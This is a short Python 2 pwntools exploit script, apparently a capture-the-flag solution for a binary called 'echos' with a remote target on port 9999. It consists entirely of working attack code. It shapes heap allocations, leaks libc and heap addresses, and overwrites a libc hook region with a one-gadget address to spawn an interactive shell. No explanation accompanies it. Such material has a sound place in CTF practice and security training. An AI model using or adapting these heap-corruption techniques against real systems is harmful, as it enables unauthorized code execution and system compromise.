#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./echos"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
libc=ELF("./bc.so.6")
heap_addr=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("echos.r3kapig.com",9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    log.debug("heap add:0x%x"%heap_addr)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(size,data):
    r.sendline(str(size))
    r.send(data)
    if len(data)!=0:
        r.recvuntil(data[:-1])

add(0x20-8,"aaa")
add(0x30-8,"aaa")
add(0x7f,"aaa")
add(0x20-8,"aaaaaaaa")
r.recv(1)
libc.address = u64(r.recv(8))-0x3c4b78
f = {
    0xa0:"aaa"
}
#add(0x80,fit(f,filler="\xcc",length=0x1f0))
add(0x30,"\xcc"*0x2f)
add(0xf0,"\xcc"*0x7f)
add(0x80,"\xcc"*0x70)
add(0x60,"\xcc"*0x4f)
add(0x80,"\xcc"*0x4f)
add(0x60,"\xcc"*0xf)
add(0x90,"\xff"*0x70)
add(0x20-8,"aaa")
add(0x30-8,"aaa")
add(0x7f,"aaa")
add(0x50,"a")

print r.recv(0x80).encode("hex")
#r.recv(0x80).encode("hex")
print r.recv(8)
print r.recv(8)
heap_addr = u64(r.recv(8))-0x1f0
#dist = libc.address + 0x5f0f48 -(heap_addr+0x500)-0x18
dist = libc.address + 0x3c5618 -(heap_addr+0x500)-0x18

add(0x200,p64(heap_addr+ 0x500 + 6 + dist+0x10)*0x33+"a"+p64(libc.address+0xf1147))
add(libc.address+0x3c4b79,"")
r.sendline(str(dist))
#add(libc.sym["__malloc_hook"]-8 - heap_addr+0x300,)
debug()
r.sendline(str(0x50))
r.sendline(str(0xFFFFFFFFFFFF))
r.interactive()




